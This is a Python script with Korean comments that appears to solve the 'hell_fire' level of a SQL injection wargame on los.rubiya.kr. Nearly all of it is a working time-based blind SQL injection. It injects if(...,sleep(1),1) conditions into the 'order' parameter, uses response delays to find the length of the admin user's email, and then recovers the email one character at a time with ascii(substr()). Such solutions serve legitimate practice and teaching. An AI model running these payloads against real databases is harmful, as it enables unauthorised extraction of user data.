import requests
from settings import session_id


# 기본 설정
url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
cookies = {'PHPSESSID': session_id}


# 이메일 자릿수 확인
# - 4부터 50까지 테스트
def find_email_length():
    for n in range(4, 50):
        # id가 admin이거나 score 값이 200인 유저로 admin 유저 탐색 가능
        # 조건이 참이면 sleep(1) 실행
        payload = f"?order=if(id='admin' and length(email)>{n},sleep(1),1)"
        res = requests.get(url + payload, cookies=cookies)

        # 조건문이 참이면 응답 지연 발생, 조건이 거짓이면 즉시 응답
        # 응답 시간이 짧으면 length(email)>{n} 구문이 거짓, 최초의 n 값 탐색
        if res.elapsed.total_seconds() < 1:
            return n
    return


# 구한 이메일 길이 값을 가지고 이메일 값을 구하는 함수
def find_email(length):
    email = str()
    for i in range(1, length + 1):
        for j in range(32, 127):
            payload = "?order=if(score=200 and ascii(substr(email,{},1))={},sleep(1),1)".format(i, j)
            res = requests.get(url + payload, cookies=cookies)

            # 응답 시간이 길면 해당 위치의 문자가 j에 해당
            if res.elapsed.total_seconds() > 1:
                char = chr(j)
                email += char
                print(email)
                break
    return email


email_length = find_email_length()
print(f"Email length: {email_length}")
email = find_email(email_length)
print(f"Email: {email}")
